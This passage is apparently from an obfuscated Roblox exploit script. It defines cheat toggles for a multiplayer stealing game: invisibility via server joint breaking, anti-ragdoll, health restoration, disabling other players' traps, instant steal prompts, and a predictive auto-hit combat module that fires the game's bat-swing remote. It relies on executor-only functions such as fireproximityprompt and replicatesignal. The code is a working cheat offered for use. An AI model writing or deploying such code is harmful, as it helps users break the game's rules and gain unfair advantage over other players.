v17.BreakJointsOnDeath = true
v17.RequiresNeck = true
v17.Health = 0
end)
pcall(function()
v17:ChangeState(Enum.HumanoidStateType.Dead)
end)
pcall(function()
arg:BreakJoints()
end)
fn44(arg)
return true
end
local function fn47(parent)
local v17 = fn40(parent)
local n20 = os.clock() + 10
while true do
if os.clock() < n20 and flag5 and parent.Parent then
v17 = v17 or fn40(parent)
if not (v17 and parent:FindFirstChild("HumanoidRootPart") and parent:FindFirstChild("Head")) then
task.wait()
continue
end
end
break
end
local humanoidRootPart = parent:FindFirstChild("HumanoidRootPart")
if not fn39() or not v17 or not humanoidRootPart or not parent:FindFirstChild("Head") then
return false
end
task.wait(0.05)
if not fn39() or parent.Parent == nil then
return false
end
for i = 1, 2 do
pcall(v17.UnequipTools, v17)
end
if type(replicatesignal) == "function" then
for i = 1, 2 do
pcall(replicatesignal, v17.ServerBreakJoints)
end
end
local hipHeight2 = v17.HipHeight
pcall(function()
v17.HipHeight = hipHeight
end)
for _, child in ipairs(parent:GetChildren()) do
if child:IsA("Accessory") or child:IsA("BasePart") and child ~= humanoidRootPart then
pcall(function()
child.Parent = nil
end)
end
end
task.wait(0.12)
local function fn48()
pcall(function()
v17.HipHeight = hipHeight2
end)
for _, child in ipairs(parent:GetChildren()) do
if child:IsA("Humanoid") and child.HipHeight ~= hipHeight2 then
pcall(function()
child.HipHeight = hipHeight2
end)
end
end
end
if parent.Parent == nil then
fn48()
return false
end
local motor6D = Instance.new("Motor6D")
motor6D.Name = "RightWrist"
motor6D.C0 = CFrame.new(1.2, 0, 0)
motor6D.C1 = CFrame.new()
motor6D.Part0 = humanoidRootPart
motor6D.Parent = humanoidRootPart
local part = Instance.new("Part")
part.Name = "RightHand"
part.Size = Vector3.new(0.2, 0.2, 0.2)
part.Transparency = 1
part.CanCollide = false
part.CanTouch = false
part.CanQuery = false
part.Massless = true
part.CFrame = humanoidRootPart.CFrame * motor6D.C0
motor6D.Part1 = part
part.Parent = parent
pcall(function()
humanoidRootPart.CanCollide = false
end)
fn48()
parent:SetAttribute("InvisApplied", true)
task.delay(1, function()
local chilliToolKeeper = (typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper
if parent.Parent and type(chilliToolKeeper) == "function" then
pcall(chilliToolKeeper)
end
end)
task.delay(0.2, function()
if humanoidRootPart.Parent then
pcall(function()
humanoidRootPart.CanCollide = true
end)
end
end)
local connection2 = parent.ChildAdded:Connect(function(child)
if child:IsA("Humanoid") then
task.defer(function()
if child.HipHeight ~= hipHeight2 then
pcall(function()
child.HipHeight = hipHeight2
end)
end
end)
end
end)
local connection3 = nil
connection3 = parent.AncestryChanged:Connect(function(child, parent2)
if parent2 == nil then
connection2:Disconnect()
connection3:Disconnect()
end
end)
return true
end
local function fn48()
local active = tbl4.Steal.Active or tbl4.Steal.Carrying or tbl4.Flying
if not active then
active = (tbl4.Driving or 0) > 0
end
return active
end
tbl4.RequestRespawn = function()
flag8 = true
end
local function fn49()
flag6 = true
local v17 = flag8
while true do
local flag9 = flag5
if flag5 then
flag9 = fn48() or not tbl4.ClaimMovement("invisibility")
end
if flag9 then
task.wait(0.2)
continue
end
break
end
local character = localPlayer.Character
if flag5 and character and (v17 or fn42(character) ~= fn39()) and fn40(character) then
flag8 = false
tbl12.Paused = true
tbl4.ShieldPaused = true
pcall(tbl4.UndoSwap)
task.wait()
fn46(localPlayer.Character)
local n20 = os.clock() + 60
local n21 = os.clock() + 8
while flag5 and os.clock() < n20 and localPlayer.Character == character do
if n21 <= os.clock() then
n21 = os.clock() + 8
fn44(character)
end
task.wait(0.05)
end
task.wait(0.1)
while flag5 and flag7 do
task.wait(0.05)
end
end
tbl12.Paused = false
tbl4.ShieldPaused = false
tbl4.ReleaseMovement("invisibility")
flag6 = false
end
local connection2 = localPlayer.CharacterAdded:Connect(function(character)
if not fn39() then
return
end
flag7 = true
tbl4.ShieldPaused = true
task.spawn(function()
pcall(fn47, character)
flag7 = false
if not flag6 then
tbl4.ShieldPaused = false
end
end)
end)
local thread = task.spawn(function()
while flag5 do
local character = localPlayer.Character
local v17 = fn40(character)
if not flag6 and not flag7 and character and v17 and v17.Health > 0 and (flag8 or fn42(character) ~= fn39()) then
fn49()
end
local v18 = fn42(localPlayer.Character)
if v18 ~= v15 then
v15 = v18
tbl4.SetSpeedForced(v18)
end
task.wait(0.25)
end
end)
local connection3 = RunService.Heartbeat:Connect(function()
local character = localPlayer.Character
if not character or not fn42(character) then
return
end
local rightHand = character:FindFirstChild("RightHand")
local tool = character:FindFirstChildWhichIsA("Tool")
local handle = tool and tool:FindFirstChild("Handle")
if not rightHand or not handle or not handle:IsA("BasePart") then
return
end
local cframe = CFrame.new()
for _, child in ipairs(rightHand:GetChildren()) do
if child:IsA("JointInstance") and child.Name == "RightGrip" and child.Part1 == handle then
cframe = child.C0 * child.C1:Inverse()
if child.Enabled then
child.Enabled = false
end
end
end
pcall(function()
handle.CFrame = rightHand.CFrame * cframe
handle.AssemblyLinearVelocity = Vector3.zero
handle.AssemblyAngularVelocity = Vector3.zero
end)
end)
fn4(function()
connection3:Disconnect()
end)
local connection4 = RunService.Heartbeat:Connect(function()
local character = localPlayer.Character
local v17 = fn40(character)
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
if not v17 or not humanoidRootPart or v17.Health <= 0 then
return
end
local flag9 = fn42(character) and not tbl4.Steal.Active and not tbl4.Flying
if flag9 then
flag9 = (tbl4.Driving or 0) == 0
end
local flag10
if flag9 then
flag10 = not (tbl4.Treadmill and tbl4.Treadmill.Riding)
else
flag10 = flag9
end
if not (flag10 and not v17.Sit and not v17.PlatformStand) then
if v16 == v17 then
v16 = nil
pcall(function()
v17.AutoRotate = true
end)
end
return
end
if v17.AutoRotate then
pcall(function()
v17.AutoRotate = false
end)
end
v16 = v17
local moveDirection = v17.MoveDirection
local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
if vector.Magnitude > 0.01 then
pcall(function()
humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
end)
end
end)
tbl4.InvisibilityHandle = v12:CreateToggle({
Name = "Invisibility",
Note = "Makes you invisible to other players",
Default = false,
Callback = function()
local str4 = nil
if type(tbl4.CombatActive) == "function" and tbl4.CombatActive() then
str4 = "Auto Hit"
end
if tbl4.Toggle(v14, false) and str4 then
flag4 = false
local v17 = v14
tbl4.UiDefer(function()
pcall(v17.Set, v17, false, false)
tbl4.Notify("Invisibility", "Turn off " .. str4 .. " first, both cannot be on at the same time")
end)
return
end
flag4 = tbl4.Toggle(v14, false) == true
if fn39() and not fn42(localPlayer.Character) and tbl4.Movement.Owner == nil then
tbl4.Movement.Owner = "invisibility"
end
end,
})
fn4(function()
flag5 = false
connection2:Disconnect()
connection4:Disconnect()
pcall(task.cancel, thread)
tbl12.Paused = false
tbl4.ShieldPaused = false
tbl4.ReleaseMovement("invisibility")
end)
end
do
local tbl33 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }
local tbl34 = {
[Enum.HumanoidStateType.Physics] = true,
[Enum.HumanoidStateType.Ragdoll] = true,
[Enum.HumanoidStateType.FallingDown] = true,
}
local n20 = 0.5
local n21 = 5
local n22 = 0
local v14 = fn2(function()
return ReplicatedStorage.Shared.Modules.Ragdoll
end)
local v15 = nil
local function fn39()
if v15 then
return v15
end
local ok, result = pcall(function()
return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
end)
if ok then
v15 = result
end
return v15
end
local v16 = nil
local flag4 = false
local connection2 = nil
local n23 = 0
local fn40 = nil
local tbl35 = {}
local tbl36 = {}
local n24 = 0
local v17 = nil
local humanoid = nil
local function fn41(arg)
for _, v18 in ipairs(arg) do
if v18.Connected then
v18:Disconnect()
end
end
table.clear(arg)
end
local function fn42(arg)
tbl35[#tbl35 + 1] = arg
end
local function fn43(arg)
tbl36[#tbl36 + 1] = arg
end
local function fn44()
if not v17 or not humanoid then
return
end
local humanoidRootPart = v17:FindFirstChild("HumanoidRootPart")
if not humanoidRootPart then
return
end
local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
local n25 = humanoid.WalkSpeed + n21
local y = assemblyLinearVelocity.Y
local flag5 = false
if n25 < vector.Magnitude then
vector = vector.Unit * n25
flag5 = true
end
if n22 < y then
y = n22
flag5 = true
end
if flag5 then
pcall(function()
humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
end)
end
end
local function fn45()
if type(v14) ~= "table" then
return
end
if type(v14.ClearClientRagdoll) == "function" then
pcall(v14.ClearClientRagdoll)
end
if type(v14.Unragdoll) == "function" then
pcall(v14.Unragdoll, v17)
end
end
local function fn46()
if not v17 or not v17.Parent then
return
end
for _, descendant in ipairs(v17:GetDescendants()) do
if tbl33[descendant.ClassName] then
pcall(function()
descendant:Destroy()
end)
end
end
end
local function fn47()
if not v17 or not v17.Parent then
return
end
for _, descendant in ipairs(v17:GetDescendants()) do
if descendant:IsA("Motor6D") and not descendant.Enabled then
pcall(function()
descendant.Enabled = true
end)
elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
pcall(function()
descendant.Enabled = true
end)
end
end
end
local function fn48()
local v18 = fn39()
if v18 and v18.controlsEnabled == false then
pcall(function()
v18:Enable()
end)
end
end
local function fn49()
local currentCamera = workspace.CurrentCamera
if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
pcall(function()
currentCamera.CameraSubject = humanoid
end)
end
end
local function fn50()
if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
return
end
if tbl34[humanoid:GetState()] then
pcall(function()
humanoid:ChangeState(Enum.HumanoidStateType.Running)
end)
end
if humanoid.PlatformStand then
humanoid.PlatformStand = false
end
end
local function fn51()
if type(v14) == "table" and type(v14.IsRagdolled) == "function" then
local ok, result = pcall(v14.IsRagdolled, v17)
if ok and result == true then
return true
end
end
local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
return num ~= nil and num > workspace:GetServerTimeNow()
end
local n25 = 21
local function fn52()
if tbl4.AntiGuard.Busy == true then
return true
end
if (tonumber(tbl4.AntiGuard.HitArms) or 0) <= 0 then
return false
end
return os.clock() - (tonumber(tbl4.AntiGuard.HitArmedAt) or 0) <= n25
end
local function fn53()
if not humanoid or not humanoid.Parent then
return false
end
if humanoid.PlatformStand then
return true
end
return tbl34[humanoid:GetState()] == true
end
local function fn54()
if not v17 or not v17.Parent then
return false
end
for _, child in ipairs(v17:GetChildren()) do
if tbl33[child.ClassName] then
return true
end
if child:IsA("BasePart") then
for _, child2 in ipairs(child:GetChildren()) do
if tbl33[child2.ClassName] then
return true
end
end
end
end
return false
end
local function fn55()
fn44()
fn45()
fn46()
fn47()
fn50()
fn48()
fn49()
end
local function fn56()
if not flag4 or fn52() then
return
end
n23 = os.clock() + n20
end
local function fn57()
local character = localPlayer.Character
if character ~= v17 then
if character then
fn40(character)
else
n24 += 1
fn41(tbl36)
v17 = nil
humanoid = nil
end
return
end
if not v17 then
return
end
if v17:FindFirstChildOfClass("Humanoid") ~= humanoid then
fn40(v17)
end
end
local function fn58()
if not flag4 then
return
end
fn57()
if not v17 or not humanoid or humanoid.Health <= 0 then
return
end
if fn52() then
n23 = 0
return
end
local now = os.clock()
if fn53() or fn51() or fn54() then
n23 = now + n20
end
if now <= n23 then
fn55()
end
end
fn40 = function(arg)
n24 += 1
local v18 = n24
fn41(tbl36)
v17 = arg
humanoid = nil
if not flag4 or not arg then
return
end
humanoid = arg:FindFirstChildOfClass("Humanoid")
if not flag4 or n24 ~= v18 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
return
end
fn43(humanoid.StateChanged:Connect(function(old, new)
if flag4 and tbl34[new] then
fn56()
end
end))
fn43(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
if flag4 and humanoid and humanoid.PlatformStand then
fn56()
end
end))
fn43(arg.DescendantAdded:Connect(function(descendant)
if flag4 and tbl33[descendant.ClassName] then
fn56()
end
end))
fn43(arg.ChildAdded:Connect(function(child)
if flag4 and child:IsA("Humanoid") and child ~= humanoid then
task.defer(fn57)
end
end))
fn49()
if fn51() then
fn56()
end
end
local function fn59()
flag4 = false
n24 += 1
n23 = 0
if connection2 then
pcall(function()
connection2:Disconnect()
end)
connection2 = nil
end
fn41(tbl36)
fn41(tbl35)
v17 = nil
humanoid = nil
end
local function fn60()
fn59()
flag4 = true
fn39()
connection2 = RunService.Heartbeat:Connect(fn58)
fn42(localPlayer.CharacterAdded:Connect(function(character)
if flag4 then
task.defer(function()
if flag4 and character == localPlayer.Character then
fn40(character)
end
end)
end
end))
fn42(localPlayer.CharacterRemoving:Connect(function(character)
if flag4 and character == v17 then
n24 += 1
n23 = 0
fn41(tbl36)
v17 = nil
humanoid = nil
end
end))
fn42(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
if flag4 then
fn56()
end
end))
local clientRagdollRemote = type(v14) == "table" and v14.ClientRagdollRemote or nil
if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
fn42(clientRagdollRemote.OnClientEvent:Connect(function()
if flag4 and not fn52() then
fn44()
fn56()
end
end))
end
fn42(tbl4.OnHumanoidChanged(function()
if flag4 and localPlayer.Character then
fn40(localPlayer.Character)
end
end))
if localPlayer.Character then
fn40(localPlayer.Character)
end
end
fn4(fn59)
v16 = v12:CreateToggle({
Name = "Anti Ragdoll",
Default = true,
Callback = function()
if tbl4.Toggle(v16, false) then
fn60()
else
fn59()
end
end,
})
end
do
local flag4 = false
local tbl33 = {}
local function fn39()
for _, v14 in ipairs(tbl33) do
pcall(function()
v14:Disconnect()
end)
end
table.clear(tbl33)
end
local function fn40(arg)
if flag4 and arg.Parent and arg.Health > 0 and arg.Health < arg.MaxHealth then
pcall(function()
arg.Health = arg.MaxHealth
end)
end
end
local function fn41(arg)
fn39()
if not flag4 or not arg then
return
end
local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
if not flag4 or not humanoid or not humanoid:IsA("Humanoid") or arg ~= localPlayer.Character then
return
end
table.insert(tbl33, humanoid.HealthChanged:Connect(function()
fn40(humanoid)
end))
table.insert(tbl33, RunService.Heartbeat:Connect(function()
fn40(humanoid)
end))
fn40(humanoid)
end
local connection2 = localPlayer.CharacterAdded:Connect(function(character)
if flag4 then
task.defer(fn41, character)
end
end)
local v14 = tbl4.OnHumanoidChanged(function()
if flag4 and localPlayer.Character then
fn41(localPlayer.Character)
end
end)
fn4(function()
flag4 = false
connection2:Disconnect()
v14:Disconnect()
fn39()
end)
flag4 = true
if localPlayer.Character then
task.spawn(fn41, localPlayer.Character)
end
end
do
local v14 = nil
local flag4 = true
local tbl33 = {}
local tbl34 = {}
local function fn39(arg)
if arg:IsA("BasePart") and tbl33[arg] == nil then
tbl33[arg] = arg.CanTouch
pcall(function()
arg.CanTouch = false
end)
end
end
local function fn40(arg)
if not flag4 or not arg.Parent then
return
end
local name = localPlayer.Name
if arg:GetAttribute("Owner") == name then
return
end
fn39(arg)
for _, descendant in ipairs(arg:GetDescendants()) do
fn39(descendant)
end
table.insert(tbl34, arg.DescendantAdded:Connect(function(descendant)
if flag4 then
fn39(descendant)
end
end))
end
local function fn41()
for _, v15 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
fn40(v15)
end
end
local function fn42()
for k, v15 in pairs(tbl33) do
if k.Parent then
pcall(function()
k.CanTouch = v15
end)
end
end
table.clear(tbl33)
end
table.insert(tbl34, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(arg)
task.defer(fn40, arg)
end))
v14 = v12:CreateToggle({
Name = "Anti Trap",
Note = "Traps from other players cannot catch you",
Default = true,
Callback = function()
flag4 = tbl4.Toggle(v14, true) == true
if flag4 then
fn41()
else
fn42()
end
end,
})
fn41()
fn4(function()
flag4 = false
for _, v15 in ipairs(tbl34) do
pcall(function()
v15:Disconnect()
end)
end
table.clear(tbl34)
fn42()
end)
end
do
local v14 = nil
local str4 = "CarryAreaEgg"
local tbl33 = { ClaimLostPart = true }
local tbl34 = {}
local connection2 = nil
local connection3 = nil
local function fn39(arg)
if not arg:IsA("ProximityPrompt") or tbl33[arg.Name] then
return
end
if tbl34[arg] == nil then
if arg.HoldDuration <= 0 and arg.Name ~= str4 then
return
end
tbl34[arg] = arg.HoldDuration
end
if arg.HoldDuration ~= 0 then
pcall(function()
arg.HoldDuration = 0
end)
end
end
local function fn40(arg)
if arg.Name ~= "SmartPromptPart" then
return nil
end
local carryAreaEgg = arg:FindFirstChild("CarryAreaEgg")
return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
end
tbl4.PromptHold = function(arg)
local v15 = tbl34[arg]
if type(v15) == "number" then
return v15
end
return arg.HoldDuration
end
local function fn41()
if connection2 then
return
end
connection3 = ProximityPromptService.PromptShown:Connect(function(arg)
if tbl4.Toggle(v14, true) then
fn39(arg)
end
end)
for _, child in ipairs(workspace:GetChildren()) do
local v15 = fn40(child)
if v15 then
fn39(v15)
end
end
connection2 = workspace.ChildAdded:Connect(function(child)
if child.Name ~= "SmartPromptPart" then
return
end
task.defer(function()
local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)
if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and tbl4.Toggle(v14, true) then
fn39(carryAreaEgg)
end
end)
end)
end
local function fn42()
for k, v15 in pairs(tbl34) do
if k and k.Parent then
pcall(function()
k.HoldDuration = v15
end)
end
end
table.clear(tbl34)
if connection2 then
connection2:Disconnect()
connection2 = nil
end
if connection3 then
connection3:Disconnect()
connection3 = nil
end
end
tbl4.PressStealPrompt = function(arg)
if typeof(fireproximityprompt) ~= "function" or not arg then
return false
end
local v15 = nil
local huge = math.huge
for _, child in ipairs(workspace:GetChildren()) do
local v16 = fn40(child)
if v16 and child:IsA("BasePart") then
local magnitude = (child.Position - arg).Magnitude
if magnitude < huge then
v15 = v16
huge = magnitude
end
end
end
if not v15 or huge > 14 then
return false
end
if tbl4.Toggle(v14, true) then
pcall(function()
v15.HoldDuration = 0
end)
end
local ok = pcall(fireproximityprompt, v15)
if ok and v15.HoldDuration > 0 then
task.wait(v15.HoldDuration + 0.1)
end
return ok
end
tbl3.Add(function()
if tbl4.Toggle(v14, true) then
fn41()
for k in pairs(tbl34) do
if not k.Parent then
tbl34[k] = nil
elseif k.HoldDuration ~= 0 then
pcall(function()
k.HoldDuration = 0
end)
end
end
elseif next(tbl34) ~= nil or connection2 then
fn42()
end
return false
end)
v14 = v12:CreateToggle({
Name = "Instant Prompts",
Default = true,
Callback = function()
tbl3.Wake()
end,
})
fn4(fn42)
end
tbl4.Combat = {}
local combat
combat = tbl4.Combat
do
local n20 = 15
local n21 = 2
local n22 = 0.05
local n23 = 1
local n24 = 0.18
local n25 = -0.275
local n26 = 0.6
local n27 = 6
local n28 = 1.1
local n29 = 0.8
local n30 = 2.5
local n31 = 35
local n32 = 0.12
local n33 = 6
local n34 = 6
local n35 = 3
local tbl33 = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
local tbl34 = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }
local tbl35 = {
Trigger = nil,
LastFire = 0,
Trace = 0,
EquipAt = 0,
Walls = {},
WallsAt = 0,
WallSide = setmetatable({}, { __mode = "k" }),
Tracks = setmetatable({}, { __mode = "k" }),
Stats = {},
Option = 3,
Pending = {},
Holders = {},
SpawnRagdoll = nil,
}
for i = 1, #tbl33 do
tbl35.Stats[i] = { Hits = 0, Shots = 0 }
end
local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Exclude
pcall(function()
raycastParams.RespectCanCollide = true
end)
local function fn39()
return workspace:GetServerTimeNow()
end
local function fn40()
local trigger = tbl35.Trigger
if trigger and trigger.Parent then
return trigger
end
local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
tbl35.Trigger = reBatSwingTrigger
return reBatSwingTrigger
end
local function fn41(arg)
return tonumber(arg:GetAttribute("RagdollEndTime")) or 0
end
combat.SetLead = function(arg)
n25 = math.clamp((tonumber(arg) or -275) / 1000, -0.4, 0.1)
end
combat.SetSweep = function(arg)
n26 = math.clamp((tonumber(arg) or 60) / 100, 0, 2.5)
end
combat.Ragdolled = function(arg)
return fn41(arg) > fn39()
end
combat.SelfRagdolled = function()
local v14 = fn41(localPlayer)
if v14 <= fn39() then
return false
end
return v14 ~= tbl35.SpawnRagdoll
end
combat.Humanoid = function(arg)
if not arg then
return nil
end
local v14 = nil
for _, child in ipairs(arg:GetChildren()) do
if child:IsA("Humanoid") then
if child.Health > 0 then
return child
end
v14 = v14 or child
end
end
return v14
end
local function fn42(arg)
local gears = tbl.Gears
local directory = type(gears) == "table" and gears.Directory or nil
local flag4 = type(directory) == "table"
if flag4 then
flag4 = directory[tostring(arg:GetAttribute("GearName") or arg.Name)]
end
flag4 = flag4 or nil
local batControllerData = type(flag4) == "table" and flag4.BatControllerData or nil
return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
end
combat.Range = function(arg)
local n36 = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
return (n20 + n21 + (arg and fn42(arg) or 0)) * n36
end
combat.PickBat = function(arg)
local tool = arg:FindFirstChildWhichIsA("Tool")
if tool and tbl4.IsBatTool(tool) then
return tool
end
local v14 = ipairs
local tbl36 = { arg, localPlayer:FindFirstChildOfClass("Backpack") }
local n36 = -1
local v15 = nil
for _, v16 in v14(tbl36) do
if v16 then
for _, child in ipairs(v16:GetChildren()) do
if tbl4.IsBatTool(child) then
local v17 = fn42(child)
if v17 > n36 then
n36 = v17
v15 = child
end
end
end
end
end
return v15
end
local function fn43(parent, arg, arg2)
if arg2.Parent == parent then
return true
end
local equipAt = tbl35.EquipAt
if os.clock() - equipAt < 0.2 then
return false
end
tbl35.EquipAt = os.clock()
pcall(function()
arg:EquipTool(arg2)
end)
if arg2.Parent ~= parent then
pcall(function()
arg2.Parent = parent
end)
end
return arg2.Parent == parent
end
combat.Parts = function(arg)
local character = arg and arg.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
return nil, nil
end
return character, humanoidRootPart
end
combat.Hittable = function(arg)
if not arg or arg == localPlayer or arg.Parent ~= Players then
return false
end
local v14, v15 = combat.Parts(arg)
if not v14 then
return false
end
if v14:GetAttribute("IsTrapped") == true or arg:GetAttribute("InBossArena") then
return false
end
return not tbl4.InsideBase(v15.Position)
end
local function fn44()
local wallsAt = tbl35.WallsAt
if os.clock() < wallsAt then
return tbl35.Walls
end
tbl35.WallsAt = os.clock() + 5
local walls = {}
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Build")
if world then
for _, child in ipairs(world:GetChildren()) do
local collisions = child:FindFirstChild("COLLISIONS")
collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")
if collisions then
for _, child2 in ipairs(collisions:GetChildren()) do
if tbl34[child2.Name] then
if child2:IsA("BasePart") then
table.insert(walls, child2)
end
for _, descendant in ipairs(child2:GetDescendants()) do
if descendant:IsA("BasePart") then
table.insert(walls, descendant)
end
end
end
end
end
end
end
tbl35.Walls = walls
return walls
end
local function fn45(arg)
if arg.X <= arg.Y and arg.X <= arg.Z then
return "X", "Y", "Z"
end
if arg.Y <= arg.Z then
return "Y", "X", "Z"
end
return "Z", "X", "Y"
end
local function fn46(arg)
local n36 = math.abs(arg.RightVector.Y)
local n37 = math.abs(arg.UpVector.Y)
local n38 = math.abs(arg.LookVector.Y)
if n36 >= n37 and n36 >= n38 then
return "X"
end
if n37 >= n38 then
return "Y"
end
return "Z"
end
local function fn47(arg, arg2, arg3, arg4)
if arg3 == arg4 then
return true
end
local n36 = arg2[arg3] + n33
return math.abs(arg[arg3]) <= n36
end
local function fn48(arg, arg2)
for _, v14 in ipairs(fn44()) do
if v14.Parent then
local cFrame = v14.CFrame
local size = v14.Size
local v15, v16, v17 = fn45(size)
local v18 = fn46(cFrame)
local n36 = size / 2
local v19 = cFrame:PointToObjectSpace(arg2)
if fn47(v19, n36, v16, v18) and fn47(v19, n36, v17, v18) then
local v20 = cFrame:PointToObjectSpace(arg)
local n37 = math.abs(v20[v15])
local n38 = tbl35.WallSide[v14]
if n37 >= n36[v15] + n33 * 0.5 or n38 == nil and n37 >= n36[v15] then
n38 = v20[v15] >= 0 and 1 or -1
tbl35.WallSide[v14] = n38
elseif n38 == nil then
n38 = v20[v15] >= 0 and 1 or -1
end
local n39 = n36[v15] + n33
if v19[v15] * n38 < n39 then
local tbl36 = { X = v19.X, Y = v19.Y, Z = v19.Z, [v15] = n38 * n39 }
arg2 = cFrame:PointToWorldSpace(Vector3.new(tbl36.X, tbl36.Y, tbl36.Z))
end
end
end
end
return arg2
end
combat.KeepOffWalls = function(arg, arg2)
local v14 = fn48(arg, arg2)
local n36 = v14 - arg
if n33 < n36.Magnitude then
local v15 = arg
for i = 1, 6 do
local n37 = arg + n36 * i / n34
local v16 = fn48(v15, n37)
if (v16 - n37).Magnitude > 0.01 then
return fn48(arg, v16)
end
v15 = v16
end
end
return v14
end
combat.ResetWalls = function()
table.clear(tbl35.WallSide)
end
local n36 = 0
local v14 = nil
local function fn49(arg)
local character = localPlayer.Character
if os.clock() - n36 > 0.5 or character ~= v14 then
n36 = os.clock()
v14 = character
local filterDescendantsInstances = {}
for _, player in ipairs(Players:GetPlayers()) do
if player.Character then
table.insert(filterDescendantsInstances, player.Character)
end
end
raycastParams.FilterDescendantsInstances = filterDescendantsInstances
end
local hit = workspace:Raycast(arg + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
if hit and arg.Y < hit.Position.Y + n35 then
return Vector3.new(arg.X, hit.Position.Y + n35, arg.Z)
end
return arg
end
local function fn50(arg, arg2)
local v15 = tbl35.Tracks[arg]
if not v15 then
local tbl36 = { Samples = {}, Smooth = nil, Heading = nil }
tbl35.Tracks[arg] = tbl36
v15 = tbl36
end
local now = os.clock()
local samples = v15.Samples
table.insert(samples, { Time = now, Position = arg2.Position })
while #samples > 2 and now - samples[1].Time > n32 do
table.remove(samples, 1)
end
local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
local v16 = samples[1]
local n37 = now - v16.Time
local v17
if n37 >= 0.03 then
local n38 = (arg2.Position - v16.Position) / n37
if n38.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= n38.Magnitude * 1.4 then
v17 = n38
else
v17 = assemblyLinearVelocity
end
else
v17 = assemblyLinearVelocity
end
local vector = Vector3.new(v17.X, 0, v17.Z)
v15.Smooth = v15.Smooth and v15.Smooth:Lerp(vector, 0.25) or vector
local smooth = v15.Smooth
if smooth.Magnitude > 1 then
local heading = v15.Heading and v15.Heading:Lerp(smooth.Unit, 0.25) or smooth.Unit
v15.Heading = heading.Magnitude > 0.01 and heading.Unit or smooth.Unit
end
return v17, vector, smooth, v15
end
local function fn51()
local n37 = 0
for _, stat in ipairs(tbl35.Stats) do
n37 += stat.Shots
end
local option = tbl35.Option
local n38 = -math.huge
for i, stat in ipairs(tbl35.Stats) do
local n39 = stat.Shots + 1
local n40 = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(n37 + 2) / n39) * 0.35
if n40 > n38 then
n38 = n40
option = i
end
end
tbl35.Option = option
return option
end
local function fn52()
local now = os.clock()
for i = #tbl35.Pending, 1, -1 do
local v15 = tbl35.Pending[i]
local v16 = tbl35.Stats[v15.Option]
if v15.RagdollBefore + 0.01 < fn41(v15.Target) then
v16.Hits = v16.Hits + 1
v16.Shots = v16.Shots + 1
table.remove(tbl35.Pending, i)
elseif v15.Wait < now - v15.At then
if (v15.Tool and tonumber(v15.Tool:GetAttribute("CooldownEndTime")) or 0) > v15.CooldownBefore + 0.01 then
v16.Shots = v16.Shots + 1
end
table.remove(tbl35.Pending, i)
end
end
end
combat.Plan = function(arg, arg2, arg3, arg4)
if not arg3 then
local v15
v15, arg3 = combat.Parts(arg)
end
if not arg3 or not arg3.Parent then
return nil
end
local n37 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
local n38 = math.clamp(n37 + n22, 0.05, 0.35)
local v15, v16, v17, v18 = fn50(arg or arg3, arg3)
local v19 = fn51()
local v20 = tbl33[v19]
local position = arg3.Position
local n39 = position + v15 * math.max(0, v20 + n37 - n38)
local n40 = position + v15 * (v20 + n37)
local magnitude = v17.Magnitude
local heading = v18.Heading
if not heading then
local vector = Vector3.new(arg2.Position.X - position.X, 0, arg2.Position.Z - position.Z)
heading = vector.Magnitude > 0.1 and vector.Unit or Vector3.new(0, 0, 1)
end
local character = localPlayer.Character
local v21 = combat.Range(character and combat.PickBat(character) or nil)
local n41 = position + v17 * (n37 + v20 + n24 + n25) + (magnitude > 1 and v17.Unit * n27 * n26 or Vector3.zero)
local n42 = math.max(5, math.min(v21 * 0.7, 6 + magnitude * 0.07)) * n26
local now = os.clock()
local n43 = (math.sin(now * 2 * 3.1415926535897931 / n28) * 0.5 + 0.5) * n42
local n44 = math.sin(now * 2 * 3.1415926535897931 / n29) * n30
local vector = Vector3.new(-heading.Z, 0, heading.X)
if vector:Dot(arg2.Position - n41) < 0 then
vector = -vector
end
local n45 = n41 + heading * n43 + vector * (v16.Magnitude < n31 and 3 or 1.5) + Vector3.new(0, n44, 0)
local position2 = arg2.Position
